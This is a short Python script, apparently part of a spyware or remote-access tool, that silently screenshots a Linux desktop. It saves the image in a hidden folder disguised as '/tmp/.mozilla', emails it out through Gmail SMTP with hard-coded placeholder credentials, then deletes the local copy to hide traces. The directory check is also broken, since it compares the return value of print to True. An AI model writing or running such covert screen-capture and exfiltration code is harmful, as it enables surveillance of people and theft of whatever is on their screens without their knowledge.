#!/usr/bin/python3

def screenshotsLinux():
    import os, smtplib 
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders

    #generic email stuff
    email_user = 'email@gmail.com'
    email_password = 'password'
    email_send = 'email@gmail.com'
    subject = 'subject'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    # taking the screenshot
    import autopy, pynput
    if print(os.path.isdir("/tmp/.mozilla")) == True:
        pass
    else:
        os.mkdir('/tmp/.mozilla')

    be = autopy.bitmap.capture_screen()
    be.save("/tmp/.mozilla/ss.png")

    # sending the screenshot
    body = 'This is the screenshot of the Desktop!'
    msg.attach(MIMEText(body,'plain'))

    filename='/tmp/.mozilla/ss.png'
    attachment  =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)


    server.sendmail(email_user,email_send,text)
    server.quit()

    # deletes screenshot
    os.remove('/tmp/.mozilla/ss.png')
